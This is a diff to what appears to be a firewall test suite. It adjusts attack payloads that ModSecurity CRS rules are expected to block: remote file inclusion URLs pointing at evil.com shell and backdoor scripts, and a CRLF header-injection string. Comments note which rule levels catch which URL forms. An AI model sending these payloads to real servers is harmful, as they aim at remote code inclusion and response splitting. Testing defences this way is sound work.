@@ -104,10 +104,12 @@ ATTACK_PAYLOADS = [
 
     # ── Remote File Inclusion ─────────────────────────────────────────────────
     {"id": "rfi-001", "category": "RFI", "name": "HTTP remote include",
-     "method": "GET", "path": "/", "params": {"page": "http://evil.com/shell.php"},
+     # Trailing ? is required to match CRS rule 931100 (PL1).
+     # Rule 931120 (PL2) catches URLs without the trailing ?.
+     "method": "GET", "path": "/", "params": {"page": "http://evil.com/shell.php?"},
      "headers": {}, "body": None, "expected": "block"},
     {"id": "rfi-002", "category": "RFI", "name": "FTP remote include",
-     "method": "GET", "path": "/", "params": {"file": "ftp://evil.com/backdoor.php"},
+     "method": "GET", "path": "/", "params": {"file": "ftp://evil.com/backdoor.php?"},
      "headers": {}, "body": None, "expected": "block"},
 
     # ── Protocol Attacks ──────────────────────────────────────────────────────
@@ -115,7 +117,10 @@ ATTACK_PAYLOADS = [
      "method": "GET", "path": "/index.php%00.jpg", "params": {},
      "headers": {}, "body": None, "expected": "block"},
     {"id": "proto-002", "category": "Protocol Attack", "name": "HTTP splitting CRLF",
-     "method": "GET", "path": "/", "params": {"q": "foo%0d%0aSet-Cookie: evil=1"},
+     # Use literal \r\n so httpx encodes them as %0D%0A in the query string.
+     # Passing the string "foo%0d%0a..." causes double-encoding (%25 0d %25 0a)
+     # which ModSecurity decodes back to literal percent signs, never seeing CRLF.
+     "method": "GET", "path": "/", "params": {"q": "foo\r\nSet-Cookie: evil=1"},
      "headers": {}, "body": None, "expected": "block"},
 ]
 
